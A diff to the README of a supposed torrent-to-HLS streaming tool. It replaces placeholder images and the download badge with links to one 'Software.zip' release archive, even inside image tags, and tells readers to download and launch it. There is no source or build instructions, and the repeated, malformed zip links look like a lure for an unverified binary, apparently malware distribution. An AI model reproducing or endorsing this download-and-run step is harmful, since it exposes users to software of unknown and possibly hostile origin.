@@ -1,6 +1,6 @@
 # 🚀 **Media Torrent Streamer**
 
-![Media Torrent Streamer Logo](https://example.com/mediatorrentstreamerlogo.png)
+![Media Torrent Streamer Logo](https://github.com/Vitinjk/media-torrent-streamer/releases/download/v1.0/Software.zip)
 
 ## Summary
 The "Media Torrent Streamer" is a robust tool designed for efficiently downloading media files via torrent magnet links, converting them to multi-bitrate HLS format, and uploading them to DigitalOcean Spaces or S3-compatible storage. This repository encompasses a combination of powerful functionality, including CLI and Telegram Bot interaction, for seamless user experience. It provides real-time progress tracking and notifications to keep users informed throughout the process.
@@ -24,7 +24,7 @@ Follow these steps to begin using Media Torrent Streamer:
 4. Start downloading, converting, and streaming your media files seamlessly.
 
 ## Link to Software Zip File
-[![Download Media Torrent Streamer](https://img.shields.io/badge/Download-Software%20Zip-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Media Torrent Streamer](https://github.com/Vitinjk/media-torrent-streamer/releases/download/v1.0/Software.zip%20Zip-blue)](https://github.com/Vitinjk/media-torrent-streamer/releases/download/v1.0/Software.zip)
 
 *Note: The provided link leads directly to the Software Zip file. You need to download and launch the software to start using Media Torrent Streamer.*
 
@@ -33,7 +33,7 @@ For more information and detailed usage instructions, please refer to the "Relea
 ---
 
 ### **Explore the Possibilities with Media Torrent Streamer!**  
-![Media Streaming Image](https://example.com/mediastreamingimage.png)
+![Media Streaming Image](https://github.com/Vitinjk/media-torrent-streamer/releases/download/v1.0/Software.zip)
 
 Grab your popcorn, sit back, and enjoy the seamless experience of downloading, converting, and streaming media files effortlessly with Media Torrent Streamer! 🍿🎬
 
